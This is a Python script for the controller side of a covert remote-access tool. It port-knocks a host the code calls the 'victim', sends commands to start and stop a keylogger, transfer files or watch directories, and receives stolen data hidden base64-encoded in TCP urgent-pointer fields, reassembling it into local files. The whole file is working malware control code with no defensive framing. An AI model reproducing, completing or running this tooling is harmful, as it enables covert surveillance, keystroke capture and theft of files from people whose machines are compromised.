import os
import base64
import threading
from scapy.all import sniff, TCP, send, IP, Raw
import sys
import socket
import time

eof_signal = 65535  # End of file signal
received_data = ""
current_signal = None
sniffing = False
dest_ip = None
sniffing_event = threading.Event()
ack_event = threading.Event()
timeout = 10  # Timeout in seconds for acknowledgment

def get_local_ip():
    """Get the local IP address of the machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external IP to get the local IP address
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

def send_signal(signal):
    """Send a signal using the encoder script."""
    os.system(f"python3 encoder.py {signal}:{dest_ip}")

def start_keylogger():
    """Start the keylogger by sending the start signal."""
    send_signal("KL_START")
    print("Keylogger started.")

def stop_keylogger():
    """Stop the keylogger by sending the stop signal and wait for the log file."""
    send_signal("KL_STOP")
    print("Keylogger stopped. Waiting for log file...")
    start_sniffing()

def start_file_transfer(file_path):
    """Start the file transfer by sending the file transfer signal."""
    os.system(f"python3 encoder.py FT:{dest_ip} {file_path}")
    print("File transfer signal sent.")

def start_watcher(file_path):
    os.system(f"python3 encoder.py WT_START:{dest_ip} {file_path}")
    print("Watcher signal sent.")
    start_sniffing()

def handle_received_data(decoded_data):
    """Handle the received data."""
    global current_signal
    print(f"Signal: {current_signal}")
    if current_signal == "KL_STOP":
        save_log_file(decoded_data)
    elif current_signal == "FT":
        save_file(decoded_data)

def packet_callback(packet):
    """Callback function to process each sniffed packet."""
    global received_data
    if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
        urgent_pointer_value = packet[TCP].urgptr
        urgent_pointer_chunk = urgent_pointer_value.to_bytes(2, 'big').decode(errors='ignore')
        received_data += urgent_pointer_chunk

        print(f"Received Urgent Pointer: {urgent_pointer_value}")
        print(f"Received Data Chunk: {urgent_pointer_chunk}")

        try:
            padded_data = received_data + '=' * ((4 - len(received_data) % 4) % 4)
            decoded_data = base64.b64decode(padded_data).decode(errors='ignore')
            print(f"Decoded Data: {decoded_data}")
            if urgent_pointer_value == eof_signal:
                print("EOF signal detected.")
                handle_received_data(decoded_data)
                received_data = ""  # Reset received_data after handling
        except (UnicodeDecodeError, base64.binascii.Error) as e:
            print(f"Decoding error: {e}")

def start_sniffing():
    """Start sniffing for packets."""
    global sniffing
    if not sniffing:
        sniffing = True
        sniffing_event.clear()
        local_ip = get_local_ip()
        print("Waiting for signal...")
        sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
        sniff_thread.start()
        try:
            while sniffing:
                time.sleep(1)
        except KeyboardInterrupt:
            print("KeyboardInterrupt detected. Stopping sniffing and sending WT_STOP signal.")
            stop_sniffing()
            send_signal("WT_STOP")
            sys.exit(0)

def sniff_packets(local_ip):
    """Sniff packets in a separate thread."""
    sniff(filter=f"tcp and dst host {local_ip} and dst port 80", prn=packet_callback, store=0, stop_filter=lambda x: sniffing_event.is_set())

def stop_sniffing():
    """Stop sniffing for packets."""
    global sniffing
    sniffing = False
    sniffing_event.set()
    print("Sniffing stopped.")

def save_log_file(encoded_data):
    """Save the log file from the encoded data."""
    save_file(encoded_data)
    stop_sniffing()
    sys.exit(0)

def save_file(encoded_data):
    """Save the file from the encoded data."""
    metadata, file_content = split_metadata_content(encoded_data)
    if not metadata:
        print("No metadata found, skipping file save.")
        return
    file_name = metadata.strip()
    file_content = file_content.strip()  # Decode the file content
    if file_content is None:
        print("No file content found, skipping file save.")
        return
    
    save_to_file(file_name, file_content)
    if file_name.endswith(".deleted"):
        original_file = file_name[:-8]  # Remove the ".deleted" extension
        original_file_path = os.path.join(os.getcwd(), dest_ip, original_file.lstrip('/'))
        if os.path.exists(original_file_path):
            os.remove(original_file_path)
            print(f"Original file {original_file_path} deleted.")

def decode_base64_data(encoded_data):
    """Decode base64 encoded data."""
    try:
        padded_data = encoded_data + '=' * ((4 - len(encoded_data) % 4) % 4)
        decoded_data = base64.b64decode(padded_data).decode(errors='ignore')
        print(f"Decoded base64 data: {decoded_data}")
        return decoded_data
    except (UnicodeDecodeError, base64.binascii.Error) as e:
        print(f"Decoding error: {e}")
        return None

def split_metadata_content(decoded_data):
    """Split the decoded data into metadata and content."""
    parts = decoded_data.split('|', 1)
    if len(parts) == 2:
        print(f"Metadata: {parts[0]}, Content: {parts[1]}")
        return parts[0], parts[1]
    else:
        print(f"Error splitting metadata and content. Decoded data: {decoded_data}")
        return None, None

def save_to_file(file_name, content):
    """Save the content to a file."""
    global dest_ip
    # Create the base directory using dest_ip
    base_dir = os.path.join(os.getcwd(), dest_ip)
    os.makedirs(base_dir, exist_ok=True)
    
    # Handle file paths with directories
    file_path = os.path.join(base_dir, file_name.lstrip('/'))
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    with open(file_path, 'w') as file:
        file.write(content)
    print(f"File {file_path} created successfully.")

def run_async_task(task):
    """Run a task asynchronously."""
    threading.Thread(target=task).start()

def send_knock_sequence(dest_ip, sequence):
    """Send the port-knocking sequence to the victim."""
    global ack_event
    ack_event.clear()
    
    # Send knock sequence
    for port in sequence:
        port = int(port)
        send_packet(dest_ip, port)
        time.sleep(1)
    
    print("Waiting for acknowledgment...")
    # Wait for acknowledgment with timeout
    if ack_event.wait(timeout):
        print("Received acknowledgment. Continuing...")
    else:
        print("No acknowledgment received. Exiting.")
        sys.exit(1)

def send_packet(dest_ip, port):
    """Send a TCP packet to the specified port."""
    ip = IP(dst=dest_ip)
    tcp = TCP(dport=port, flags="S")
    packet = ip/tcp
    send(packet)

def ack_callback(packet):
    """Callback function to handle acknowledgment packets."""
    try:
        if (packet.haslayer(TCP) and 
            packet[TCP].flags & 0x12 and  # SYN-ACK flags
            packet.haslayer(Raw) and 
            b'ACK' in packet[Raw].load):
            ack_event.set()
    except AttributeError:
        pass  # Ignore packets without the expected layers/attributes

def main():
    """Main function to handle user input and execute corresponding actions."""
    global current_signal, dest_ip
    dest_ip = input("Enter the destination IP for sending signals: ")
    knock_sequence = input("Enter the port-knocking sequence (comma-separated): ").split(",")

    # Start sniffing for acknowledgment packets with more specific filter
    sniff_thread = threading.Thread(
        target=sniff, 
        kwargs={
            'filter': f"tcp and src host {dest_ip} and (tcp[13] & 0x12 != 0)", 
            'prn': ack_callback, 
            'store': 0
        }
    )
    sniff_thread.daemon = True  # Make thread daemon so it exits when main thread exits
    sniff_thread.start()

    # Send the port-knocking sequence
    send_knock_sequence(dest_ip, knock_sequence)

    options = {
        "1": start_keylogger,
        "2": stop_keylogger,
        "3": lambda: start_file_transfer(input("Enter the file path to transfer: ")),
        "4": lambda: start_watcher(input("Enter the file or directory to watch: ")),
    }

    print("Choose an option:")
    print("1. Start Keylogger")
    print("2. Stop Keylogger")
    print("3. File Transfer")
    print("4. Watcher")
    choice = input("Enter your choice (1, 2, 3, or 4): ")

    if choice in options:
        current_signal = "KL_STOP" if choice == "2" else "FT"
        run_async_task(options[choice])
    else:
        print("Invalid choice. Please enter 1, 2, 3, or 4.")

if __name__ == "__main__":
    main()
